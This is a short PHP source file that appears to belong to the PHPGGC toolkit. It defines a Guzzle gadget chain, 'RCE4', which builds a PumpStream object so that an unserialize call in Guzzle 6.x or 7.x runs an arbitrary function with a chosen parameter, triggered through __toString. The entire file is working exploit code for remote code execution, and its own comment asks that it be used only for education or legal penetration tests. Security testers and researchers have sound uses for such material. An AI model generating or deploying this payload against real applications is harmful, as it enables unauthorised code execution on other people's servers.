<?php

namespace GadgetChain\Guzzle;

class RCE4 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
  public static $version = '6.x, 7.x';
  public static $vector = '__toString';
  public static $author = 'mir-hossein (Mirhossein Rahmani)';
  public static $information = 'This GC has been provided to demonstrate PHP-IAA trick. Please use it only for educational purposes or legal pentest.';

  public function generate(array $parameters)
  {
    $function = $parameters["function"];
    $parameter = $parameters["parameter"];
         
    return new \GuzzleHttp\Psr7\PumpStream($function, $parameter);
  }
}